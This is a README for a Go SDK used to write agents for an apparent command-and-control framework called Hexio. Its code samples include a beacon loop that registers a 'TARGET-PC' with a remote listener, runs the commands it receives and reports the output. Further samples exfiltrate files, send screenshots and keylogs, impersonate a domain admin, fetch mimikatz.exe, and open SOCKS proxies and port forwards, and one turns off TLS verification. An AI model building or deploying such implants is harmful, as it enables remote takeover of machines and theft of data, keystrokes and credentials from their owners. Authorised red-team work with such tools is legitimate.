# Hexio External Agent SDK for Go

A zero-dependency Go client for the Hexio External Agent REST API.

## Installation

```bash
go get github.com/cyberm-technologies/ExternalAgentSDK/go
```

Or copy `hexio_sdk.go` into your project directly.

## Quick Start

```go
package main

import (
    "fmt"
    "time"

    hexio "github.com/cyberm-technologies/ExternalAgentSDK/go"
)

func main() {
    // Connect to the External Agent listener
    client := hexio.NewClient("http://10.0.0.1:9000", "my-passphrase")

    // Register the agent
    reg, err := client.Register(hexio.RegisterRequest{
        Hostname:   "TARGET-PC",
        Ip:         "10.0.0.50",
        User:       "admin",
        Os:         "Windows 10 Pro",
        Process:    "agent.exe",
        Pid:        4832,
        ClientType: "my_go_agent",
        SleepTime:  5,
    })
    if err != nil {
        panic(err)
    }
    fmt.Printf("Registered as agent %d\n", reg.AgentID)
    // client.Token is automatically set

    // Main beacon loop
    for {
        checkin, err := client.Checkin()
        if err != nil {
            time.Sleep(5 * time.Second)
            continue
        }

        for _, cmd := range checkin.Commands {
            // Execute command locally
            output := executeCommand(cmd.Command)

            // Report result
            client.CommandResponse(cmd.Id, cmd.Command, output)
        }

        time.Sleep(5 * time.Second)
    }
}

func executeCommand(cmd string) string {
    // Your command execution logic here
    return "command output"
}
```

## API Reference

### Client Creation

```go
client := hexio.NewClient(baseURL, passphrase)
```

### Registration

```go
resp, err := client.Register(hexio.RegisterRequest{...})
// resp.AgentID, resp.Token
// client.Token is set automatically
```

### Checkin / Sync

```go
// Simple heartbeat
checkin, err := client.Checkin()

// Full sync with sleep update
sleepTime := int64(10)
jitter := int64(3)
checkin, err := client.Sync(&sleepTime, &jitter)
```

### Command Response

```go
err := client.CommandResponse(commandId, "whoami", "nt authority\\system")
```

### File Downloads (Exfiltration)

```go
// Init a download
resp, err := client.DownloadInit(hexio.DownloadInitRequest{
    FileName:    "data.db",
    AgentPath:   "/tmp/data.db",
    FileSize:    len(fileBytes),
    ChunkSize:   65536,
    TotalChunks: totalChunks,
})

// Send chunks
status, err := client.DownloadChunk(resp.DownloadId, base64ChunkData)

// Cancel if needed
err := client.DownloadCancel(downloadId)
```

### Screenshots and Keylogs

```go
err := client.Screenshot("screen.png", base64ImageData)
err := client.Keylog("keys.txt", keystrokeData)
```

### Impersonation

```go
err := client.SetImpersonation("DOMAIN\\Admin")
err := client.ClearImpersonation()
```

### Side Channels

```go
err := client.Sidechannel("shell-session-1", base64Output)
```

### File Requests

```go
files, err := client.RequestFiles(hexio.FileRequestPayload{
    BofFiles: []string{"whoami.o"},
    PeFiles:  []string{"mimikatz.exe"},
})
// files.BofFiles["whoami.o"] contains base64 data
```

### SOCKS Proxy

```go
port, err := client.SocksOpen(nil)       // auto-assign port
port, err := client.SocksOpen(&myPort)    // specific port
err := client.SocksClose()
data, err := client.SocksSync(inboundData)
```

### Port Forwarding

```go
err := client.PortFwdOpen(8080, "10.0.0.5", 3389)
err := client.PortFwdClose(8080)
data, err := client.PortFwdSync(syncEntries)
```

## Custom HTTP Client

You can provide your own `http.Client` for proxy support, custom TLS, timeouts, etc:

```go
client := hexio.NewClient("http://10.0.0.1:9000", "passphrase")
client.HTTPClient = &http.Client{
    Timeout: 60 * time.Second,
    Transport: &http.Transport{
        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        Proxy: http.ProxyURL(proxyURL),
    },
}
```
